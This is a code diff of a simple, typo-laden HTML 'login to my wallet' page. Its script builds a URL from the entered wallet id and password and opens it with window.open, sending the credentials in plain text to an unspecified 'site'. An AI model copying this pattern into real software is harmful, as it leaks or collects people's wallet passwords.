@@ -9,17 +9,19 @@
   </head>
   <html>
   <body>
-  <h1 align="above">welcome to program center(login to my wallet page)</h1>
+  <h1 align="above">login to my wallet</h1>
   <br>
   	<label>enter your wallet id:</label>
     <form role="text" id="fo">
 		<input type="text" id="query" name="q" placeholder="enter your wallet id" required aria-required="true">
 	
     </form>
+    <br>
 	<label>enter your password:</label>
     <form role="text" id="for">
 	  	  		<input type="password" id="password" name="p" placeholder="enter your password" required aria-required="true">
 	</form>
+  <br>
 	<br>
 	    <form role="text" id="form">
     		<button type="submit" width="500" height="500">login</button>
@@ -36,11 +38,11 @@
         if (navigator.onLine) {
           // work
         } else {
-          alert("you must be online to use the feture");
+          alert("this option is not availble u ntil you connect to your interten please connect to your internet");
         }
         event.preventDefault();
         const url = site + '/' + 'u=' + q.value + 'p=' + p.value;
-        const win = window.open(url);
+        const win = open(url);
         win.focus();
       }
       f.addEventListener('submit', submitted)
@@ -90,7 +92,7 @@ a {
     color:#35ad4f
 }
         body {
-        margin: 200px 40%;
+          margin: 230px 40%;
         background-image:
       -webkit-repeating-linear-gradient(top,
       rgb(166, 255, 0) 0%,
